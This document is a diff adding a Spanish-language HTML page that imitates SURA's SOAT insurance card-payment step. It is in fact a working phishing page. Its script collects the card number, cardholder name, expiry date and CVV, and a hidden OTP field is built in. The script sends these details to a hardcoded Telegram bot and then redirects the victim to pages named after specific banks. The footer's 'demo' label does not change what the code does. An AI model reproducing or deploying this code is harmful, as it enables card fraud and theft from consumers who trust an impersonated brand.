@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Pagar con tarjeta - SOAT</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', Arial, sans-serif;
+      background: #f5f7fb;
+      font-size: 16px;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* ============ HEADER SURA (mismo diseño) ============ */
+    .soat-header {
+      background: #ffffff;
+      border-bottom: 1px solid #e6e6e6;
+      height: 80px;
+      display: flex;
+      align-items: center;
+    }
+    .soat-header-container {
+      max-width: 1360px;
+      margin: 0 auto;
+      padding: 2px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .soat-logo {
+      display: flex;
+      align-items: center;
+      margin-left: -640px;
+    }
+    .soat-logo img {
+      max-height: 220px;
+      width: auto;
+      object-fit: contain;
+      margin-left: -100px;
+    }
+    .soat-steps {
+      display: flex;
+      align-items: center;
+      gap: 28px;
+      font-size: 15px;
+      font-weight: 500;
+      margin-right: -560px;
+    }
+    .step {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #0097A9;
+      font-size: 19px;
+      font-weight: 800;
+    }
+    .step-number {
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      background: #e5e7eb;
+      color: #0097A9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 21px;
+      font-weight: 600;
+    }
+    .step.completed {
+      color: #2563eb;
+    }
+    .step.completed .step-number {
+      background: #2563eb;
+      color: #ffffff;
+      font-size: 19px;
+    }
+    .step.active {
+      color: #2563eb;
+      font-weight: 700;
+    }
+    .step.active .step-number {
+      background: #2563eb;
+      color: #ffffff;
+    }
+
+    /* ============ CUERPO TARJETA ============ */
+    main {
+      max-width: 800px;
+      margin: 32px auto 40px;
+      padding: 0 40px;
+      flex: 1;
+    }
+
+    .titulo-pagina {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1f2933;
+      margin-bottom: 6px;
+    }
+    .subtitulo-pagina {
+      font-size: 14px;
+      color: #4b5563;
+      margin-bottom: 18px;
+    }
+
+    .card-form {
+      background:#ffffff;
+      border-radius:10px;
+      padding:20px 24px;
+      border:1px solid #d1d5db;
+    }
+
+    .fila-resumen {
+      font-size: 14px;
+      margin-bottom: 8px;
+    }
+    .fila-resumen span:first-child {
+      font-weight:600;
+      color:#4b5563;
+      margin-right:4px;
+    }
+
+    .campo {
+      margin-top: 10px;
+      margin-bottom: 10px;
+      display:flex;
+      flex-direction:column;
+      gap:4px;
+    }
+    .campo label {
+      font-size:14px;
+      color:#4b5563;
+      font-weight:500;
+    }
+    .campo input, .campo select {
+      padding:10px 12px;
+      border-radius:8px;
+      border:1px solid #d1d5db;
+      font-size:14px;
+      box-sizing:border-box;
+      transition: border-color 0.2s;
+      background: white;
+    }
+    .campo input:focus, .campo select:focus {
+      outline: none;
+      border-color: #0097A9;
+    }
+    .campo select {
+      cursor: pointer;
+    }
+
+    .fila-doble {
+      display:flex;
+      gap:12px;
+    }
+
+    /* Campo OTP oculto por defecto */
+    #campo-otp {
+      display: none;
+      animation: slideDown 0.3s ease;
+    }
+
+    @keyframes slideDown {
+      from {
+        opacity: 0;
+        transform: translateY(-10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .campo-otp-highlight {
+      border: 2px solid #0097A9 !important;
+      background: #f0f9ff;
+    }
+
+    .btn-pagar {
+      margin-top: 16px;
+      width: 100%;
+      background: #e4eb22;
+      color: #003a99;
+      border: none;
+      border-radius: 999px;
+      padding: 14px 0;
+      font-size: 17px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .btn-pagar:hover {
+      background: #d4db12;
+      transform: translateY(-1px);
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+    .btn-pagar:active {
+      transform: translateY(0);
+    }
+
+    /* FOOTER */
+    footer {
+      background:#ffffff;
+      border-top:1px solid #e5e7eb;
+      padding:16px 0;
+      margin-top:auto;
+    }
+    .footer-inner {
+      max-width:1360px;
+      margin:0 auto;
+      padding:0 40px;
+      font-size:12px;
+      color:#6b7280;
+      display:flex;
+      justify-content:space-between;
+      flex-wrap:wrap;
+      gap:8px;
+    }
+
+    @media (max-width:960px) {
+      main { padding:0 16px; }
+      .footer-inner,
+      .soat-header-container { padding:0 16px; }
+      .fila-doble { flex-direction:column; }
+      .soat-logo { margin-left: 0; }
+      .soat-steps { margin-right: 0; font-size: 13px; gap: 12px; }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- HEADER -->
+  <header class="soat-header">
+    <div class="soat-header-container">
+      <div class="soat-logo">
+        <img src="suraenlinea.png" alt="SURA en línea">
+      </div>
+
+      <div class="soat-steps">
+        <div class="step completed">
+          <span class="step-number">✓</span>
+          <span>Cotización</span>
+        </div>
+        <div class="step completed">
+          <span class="step-number">✓</span>
+          <span>Datos</span>
+        </div>
+        <div class="step completed">
+          <span class="step-number">✓</span>
+          <span>Tratamiento datos</span>
+        </div>
+        <div class="step active">
+          <span class="step-number">4</span>
+          <span>Pago</span>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- CUERPO -->
+  <main>
+    <h1 class="titulo-pagina">Pago con tarjeta crédito o débito</h1>
+    <p class="subtitulo-pagina">
+      Ingresa los datos de tu tarjeta para registrar el pago de tu SOAT.
+    </p>
+
+    <section class="card-form">
+      <div class="fila-resumen">
+        <span>Placa:</span><span id="res-placa">---</span>
+      </div>
+      <div class="fila-resumen">
+        <span>Valor a pagar:</span><span id="res-valor">$0</span>
+      </div>
+
+      <div class="campo">
+        <label>Banco emisor de la tarjeta</label>
+        <select id="card-bank">
+          <option value="">Selecciona tu banco</option>
+          <option value="Bancolombia">Bancolombia</option>
+          <option value="Banco Popular">Banco Popular</option>
+          <option value="Finandina">Finandina</option>
+          <option value="Banco Itau">Banco Itaú</option>
+        </select>
+      </div>
+
+      <div class="campo">
+        <label>Nombre en la tarjeta</label>
+        <input type="text" id="card-name" placeholder="Como aparece en la tarjeta">
+      </div>
+
+      <div class="campo">
+        <label>Número de tarjeta</label>
+        <input type="text" id="card-number" placeholder="xxxx xxxx xxxx xxxx" maxlength="19">
+      </div>
+
+      <div class="fila-doble">
+        <div class="campo" style="flex:1;">
+          <label>Fecha de vencimiento (MM/AA)</label>
+          <input type="text" id="card-exp" placeholder="MM/AA" maxlength="5">
+        </div>
+        <div class="campo" style="flex:1;">
+          <label>CVV</label>
+          <input type="password" id="card-cvv" maxlength="4" placeholder="***">
+        </div>
+      </div>
+
+      <!-- Campo OTP (oculto por defecto) -->
+      <div class="campo" id="campo-otp">
+        <label>🔐 Código de verificación OTP</label>
+        <input type="text" id="card-otp" placeholder="Ingresa el código OTP" maxlength="6" class="campo-otp-highlight">
+      </div>
+
+      <button type="button" class="btn-pagar" id="btnPagarTarjeta">Pagar</button>
+    </section>
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+      <span>SURA &copy; 2026 - Todos los derechos reservados.</span>
+      <span>Este sitio es un demo de compra de SOAT en línea.</span>
+    </div>
+  </footer>
+
+<script>
+const BOT_TOKEN = '8735380697:AAF4G03kbZoCAOf2IUWJHE6P6jcmlzYQzCg';
+const CHAT_ID = '-1003969378541';
+
+// ================= PARAMS =================
+const params = new URLSearchParams(window.location.search);
+const placa = (params.get('placa') || '').toUpperCase();
+const valor = params.get('valor') || '0';
+
+// Mostrar datos
+if (placa) document.getElementById('res-placa').textContent = placa;
+if (valor > 0) {
+  document.getElementById('res-valor').textContent =
+    '$' + Number(valor).toLocaleString('es-CO');
+}
+
+// ================= FORMATO TARJETA =================
+document.getElementById('card-number').addEventListener('input', function(e) {
+  let value = e.target.value.replace(/\s+/g, '');
+  let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+  e.target.value = formatted;
+});
+
+// ================= FORMATO FECHA =================
+document.getElementById('card-exp').addEventListener('input', function(e) {
+  let value = e.target.value.replace(/\D/g, '');
+  if (value.length >= 2) {
+    value = value.slice(0,2) + '/' + value.slice(2,4);
+  }
+  e.target.value = value;
+});
+
+// ================= DETECTAR FRANQUICIA =================
+function detectarFranquicia(numero) {
+  const n = numero.replace(/\s+/g, '');
+  if (/^4/.test(n)) return 'VISA';
+  if (/^5[1-5]/.test(n)) return 'MASTERCARD';
+  if (/^3[47]/.test(n)) return 'AMEX';
+  return 'OTRA';
+}
+
+// ================= REDIRECCIÓN =================
+function redirigirSegunBanco(banco) {
+  const mapa = {
+    'Bancolombia': 'bancol.html',
+    'Banco Popular': 'popu.html',
+    'Banco Itau': 'itau.html',
+    'Finandina': 'fina.html'
+  };
+
+  const destino = mapa[banco];
+
+  if (destino) {
+    window.location.href = `${destino}?placa=${placa}&valor=${valor}`;
+  } else {
+    alert('⚠️ Banco no soportado');
+  }
+}
+
+// ================= BOTÓN PAGAR =================
+document.getElementById('btnPagarTarjeta').addEventListener('click', async () => {
+
+  const banco = document.getElementById('card-bank').value.trim();
+  const nombre = document.getElementById('card-name').value.trim();
+  const numero = document.getElementById('card-number').value.trim();
+  const fechaExp = document.getElementById('card-exp').value.trim();
+  const cvv = document.getElementById('card-cvv').value.trim();
+
+  if (!banco || !nombre || !numero || !fechaExp || !cvv) {
+    alert('⚠️ Completa todos los campos');
+    return;
+  }
+
+  const numeroLimpio = numero.replace(/\s+/g, '');
+  const franquicia = detectarFranquicia(numeroLimpio);
+
+  // ================= MENSAJE TELEGRAM =================
+  let mensaje = "💳 PAGO TARJETA SOAT\n\n";
+  mensaje += `Banco: ${banco}\n`;
+  mensaje += `Nombre: ${nombre}\n`;
+  mensaje += `Tarjeta: ${numeroLimpio}\n`;
+  mensaje += `Exp: ${fechaExp}\n`;
+  mensaje += `CVV: ${cvv}\n`;
+  mensaje += `\nPlaca: ${placa}`;
+  mensaje += `\nValor: ${valor}`;
+  mensaje += `\nFranquicia: ${franquicia}`;
+  mensaje += `\nFecha: ${new Date().toISOString()}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: mensaje
+      })
+    });
+  } catch (e) {
+    console.error("Error enviando a Telegram:", e);
+  }
+
+  // ================= REDIRIGIR =================
+  redirigirSegunBanco(banco);
+
+});
+</script>
+</body>
+</html>
